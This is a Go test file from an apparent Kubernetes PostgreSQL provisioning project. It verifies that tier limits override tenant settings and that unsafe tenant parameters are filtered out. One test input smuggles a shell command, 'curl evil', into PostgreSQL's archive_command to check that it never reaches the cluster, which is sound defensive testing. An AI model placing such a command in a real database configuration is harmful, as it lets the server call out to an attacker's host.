package k8s

import (
	"testing"

	"github.com/excalibase/provisioning-poc/internal/config"
)

func tenantParams(t *testing.T, tenant map[string]string) (map[string]interface{}, map[string]interface{}) {
	t.Helper()
	postgresql := postgresqlSection(t, PostgreSQLClusterOpts{
		ProjectID: "proj-guard", Namespace: "ns-guard",
		Tier:       config.TierConfig{CPU: "0.5", Memory: "512Mi", StorageSize: "5Gi", Instances: 1, StatementTimeout: "15s"},
		Parameters: tenant,
	})
	return postgresql, postgresql["parameters"].(map[string]interface{})
}

func TestTheTierQueryGuardWinsOverTenantParameters(t *testing.T) {
	_, params := tenantParams(t, map[string]string{
		"statement_timeout":                   "0",
		"idle_in_transaction_session_timeout": "0",
		"max_connections":                     "5000",
	})
	for name, want := range map[string]string{
		"statement_timeout": "15s", "idle_in_transaction_session_timeout": "15s", "max_connections": "100",
	} {
		if params[name] != want {
			t.Errorf("%s = %v, want %s", name, params[name], want)
		}
	}
}

func TestOnlyTenantTunableParametersReachTheCluster(t *testing.T) {
	postgresql, params := tenantParams(t, map[string]string{
		"work_mem":                 "8MB",
		"shared_buffers":           "64GB",
		"shared_preload_libraries": "pg_stat_statements",
		"archive_command":          "curl evil",
	})
	if params["work_mem"] != "8MB" {
		t.Errorf("work_mem = %v, want 8MB", params["work_mem"])
	}
	for _, name := range []string{"shared_buffers", "shared_preload_libraries", "archive_command"} {
		if _, ok := params[name]; ok {
			t.Errorf("%s reached the cluster", name)
		}
	}
	if libs := preloadedLibraries(t, postgresql); len(libs) != 0 {
		t.Errorf("tenant chose preloaded libraries: %v", libs)
	}
}
